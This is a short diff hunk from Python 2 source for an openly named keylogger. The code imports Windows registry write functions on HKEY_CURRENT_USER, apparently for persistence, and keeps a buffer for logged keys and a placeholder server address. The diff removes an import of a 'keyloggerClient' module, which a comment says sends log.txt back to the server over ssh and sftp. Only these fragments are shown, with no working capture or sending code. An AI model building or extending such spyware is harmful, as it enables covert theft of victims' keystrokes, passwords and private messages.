@@ -12,8 +12,6 @@ from _winreg import SetValueEx, OpenKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_
 
 from Tkinter import Frame, Tk, Button  # For GUI
 
-from keyloggerClient import *  # Contains the ssh and sftp functions used to send back log.txt to the server
-
 data = ''  # To hold logged key
 exitStack = []
 hostAddress = <Server IP>
